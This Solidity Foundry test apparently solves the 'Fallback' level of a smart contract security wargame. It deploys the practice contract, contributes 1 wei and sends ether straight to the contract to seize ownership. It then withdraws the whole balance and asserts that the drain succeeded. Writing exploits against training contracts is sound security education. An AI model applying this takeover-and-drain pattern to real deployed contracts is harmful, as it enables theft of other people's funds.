// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/01_Fallback.sol";

contract AttackerFallbackTest is Test {
    function testFallback() external {
        vm.prank(address(1));
        Fallback fallbck = new Fallback();

        fallbck.contribute{value: 1 wei}();
        fallbck.getContribution();

        assertFalse(fallbck.owner() == address(this));
        assertFalse(address(fallbck).balance == 0);

        (bool success,) = address(fallbck).call{value: 1 wei}("");
        require(success, "Transfer failed!");

        fallbck.withdraw();

        assertTrue(fallbck.owner() == address(this));
        assertTrue(address(fallbck).balance == 0);
    }

    receive() external payable {}
}
